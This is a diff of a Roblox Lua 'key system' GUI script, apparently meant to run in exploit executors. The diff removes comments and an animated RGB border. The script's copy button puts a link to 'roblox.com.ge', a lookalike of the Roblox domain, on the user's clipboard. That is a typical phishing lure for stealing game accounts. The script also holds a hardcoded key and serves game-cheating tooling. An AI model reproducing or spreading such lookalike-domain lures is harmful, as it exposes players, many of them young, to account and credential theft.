@@ -1,4 +1,3 @@
--- Clean Key System with RGB border glow (works with exploit setclipboard)
 local player = game.Players.LocalPlayer
 local gui = Instance.new("ScreenGui")
 gui.Name = "CleanKeySystem"
@@ -8,7 +7,6 @@ gui.ResetOnSpawn = false
 local correctKey = "MySecretKey123"
 local linkToCopy = "https://roblox.com.ge/communities/9724508409/"
 
--- Main frame
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 320, 0, 270)
 frame.Position = UDim2.new(0.5, -160, 0.5, -135)
@@ -19,14 +17,6 @@ corner.CornerRadius = UDim.new(0, 12)
 corner.Parent = frame
 frame.Parent = gui
 
--- RGB border (UIStroke with changing color)
-local rgbBorder = Instance.new("UIStroke")
-rgbBorder.Thickness = 2
-rgbBorder.Transparency = 0.3
-rgbBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-rgbBorder.Parent = frame
-
--- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 48)
 title.Position = UDim2.new(0, 0, 0, 0)
@@ -43,7 +33,6 @@ titleCorner.CornerRadius = UDim.new(0, 12)
 titleCorner.Parent = title
 title.Parent = frame
 
--- Input field
 local keyBox = Instance.new("TextBox")
 keyBox.Size = UDim2.new(0.8, 0, 0, 40)
 keyBox.Position = UDim2.new(0.1, 0, 0.32, 0)
@@ -60,7 +49,6 @@ inputCorner.CornerRadius = UDim.new(0, 8)
 inputCorner.Parent = keyBox
 keyBox.Parent = frame
 
--- Buttons
 local checkBtn = Instance.new("TextButton")
 checkBtn.Size = UDim2.new(0.35, 0, 0, 40)
 checkBtn.Position = UDim2.new(0.1, 0, 0.55, 0)
@@ -89,7 +77,6 @@ copyCorner.CornerRadius = UDim.new(0, 8)
 copyCorner.Parent = copyBtn
 copyBtn.Parent = frame
 
--- Message label
 local message = Instance.new("TextLabel")
 message.Size = UDim2.new(0.8, 0, 0, 30)
 message.Position = UDim2.new(0.1, 0, 0.72, 0)
@@ -101,7 +88,6 @@ message.TextSize = 12
 message.TextXAlignment = Enum.TextXAlignment.Center
 message.Parent = frame
 
--- Hint (bigger)
 local hint = Instance.new("TextLabel")
 hint.Size = UDim2.new(0.9, 0, 0, 30)
 hint.Position = UDim2.new(0.05, 0, 0.86, 0)
@@ -113,18 +99,6 @@ hint.TextSize = 14
 hint.TextXAlignment = Enum.TextXAlignment.Center
 hint.Parent = frame
 
--- === RGB COLOR CYCLE ===
-spawn(function()
-    local hue = 0
-    while true do
-        hue = (hue + 0.005) % 1  -- плавное изменение
-        local color = Color3.fromHSV(hue, 1, 1)
-        rgbBorder.Color = color
-        task.wait(0.05)
-    end
-end)
-
--- === LOGIC ===
 checkBtn.MouseButton1Click:Connect(function()
     if keyBox.Text == correctKey then
         message.Text = "✓ Correct key"
@@ -150,7 +124,6 @@ copyBtn.MouseButton1Click:Connect(function()
     message.Text = ""
 end)
 
--- Hover effects
 copyBtn.MouseEnter:Connect(function()
     copyBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 110)
 end)
